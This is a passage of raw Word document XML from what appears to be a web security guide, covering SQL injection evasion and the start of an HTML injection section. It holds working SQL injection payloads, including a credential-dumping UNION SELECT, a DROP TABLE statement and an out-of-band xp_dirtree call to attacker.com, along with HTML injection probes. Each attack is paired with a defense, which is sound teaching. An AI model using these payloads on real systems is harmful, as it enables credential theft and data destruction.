          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Example (MSSQL): '; DROP TABLE users--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E7F42B" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="004B7CA3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="159" w:name="_Toc208408630"/>
      <w:r>
        <w:t>8. Advanced Evasion &amp; Bypass Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="159"/>
    </w:p>
    <w:p w14:paraId="048F092A" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Attackers may bypass filters with:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Encoding (%27 for ')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Hex/Char injection (CHAR(65)+CHAR(68)+CHAR(77) = ADM)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Comment injection (UN/**/ION SEL/**/ECT)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Case variations (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>uNiOn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SeLeCt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- String concatenation (CONCAT('us','</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5F472D" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F" w:rsidP="004B7CA3">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:bookmarkStart w:id="160" w:name="_Toc208408631"/>
      <w:r>
        <w:t>Quick Attack → Defense Mapping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="160"/>
    </w:p>
    <w:p w14:paraId="283A8F06" w14:textId="77777777" w:rsidR="0098101F" w:rsidRDefault="0098101F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1254969984"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Union-based: ' UNION SELECT </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>username,password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> FROM users-- → Use Prepared Statements</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Error-based: ' AND 1=CONVERT(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,(SELECT @@version))-- → Error handling</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Boolean-based: ' AND 'a'='a vs ' AND 'a'='b → Whitelisting inputs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Time-based: ' OR IF(1=1,SLEEP(5),0)-- → Limit query timeouts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Out-of-band: exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xp_dirtree</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> '//attacker.com/test' → Restrict outbound connections</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Second-order: stored payload reuse → Sanitize stored inputs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Stacked queries: '; DROP TABLE users-- → Disable stacked queries</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3024466E" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43B44DCC" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CDF3B81" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3584B8FE" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55BFF40A" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A9ED784" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="274EF5A8" w14:textId="01390BC0" w:rsidR="00985602" w:rsidRDefault="00985602" w:rsidP="00BC6303">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="161" w:name="_Toc208408632"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>HTML Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="161"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F0DB4A" w14:textId="782F458F" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00BC6303">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
        <w:rPr>
          <w:kern w:val="36"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="162" w:name="_Toc208408633"/>
      <w:r>
        <w:t>Definition &amp; Threat Model</w:t>
      </w:r>
      <w:bookmarkEnd w:id="162"/>
    </w:p>
    <w:p w14:paraId="411995AD" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">HTML Injection occurs when untrusted input is inserted into a page’s </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>markup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and is interpreted by the browser as HTML. This allows attacker-controlled elements/attributes to render in the page. Impacts include UI tampering, phishing, and potential escalation to DOM-based XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8FE7FD" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Root cause: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Unsanitized</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> input + missing output encoding.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Risky sinks: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">(), jQuery.html(), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>insertAdjacentHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C39C17" w14:textId="6C9BF62A" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00BC6303">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="163" w:name="_Toc208408634"/>
      <w:r>
        <w:t>Injection Contexts</w:t>
      </w:r>
      <w:bookmarkEnd w:id="163"/>
    </w:p>
    <w:p w14:paraId="3F480DA0" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A. Element Body Context: Input becomes child HTML inside tags.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">   Probe: &lt;u&gt;test&lt;/u&gt; → if underlined, HTML parsed.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">   Escalation: &lt;/div&gt;&lt;div id=owned&gt; → changes DOM structure.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>B. Attribute Value Context: Input ends up in attribute value.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">   Probe: " title="hovered → adds tooltip if parsed.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">C. URL Sub-Contexts: Input in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, action attributes.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">   Risk: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>: or data: protocols.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">D. Special HTML Islands: SVG, MathML, iframe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>srcdoc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, &lt;base&gt; tag.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3F82D9" w14:textId="55C3F4D6" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00BC6303">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="164" w:name="_Toc208408635"/>
      <w:r>
        <w:t>Advanced Vectors &amp; Chains</w:t>
      </w:r>
      <w:bookmarkEnd w:id="164"/>
    </w:p>
    <w:p w14:paraId="018BA2DE" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- Event attributes: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>onload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>onclick</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> → escalate to DOM XSS.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Template escapes: bypass </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>templating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> safeguards.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- &lt;base&gt; tag: rewrite relative resource loading.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Phishing overlays: injected forms for credential theft.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Second-order: stored HTML rendered unsafely later.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F3BE91" w14:textId="7E0E3962" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00BC6303">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
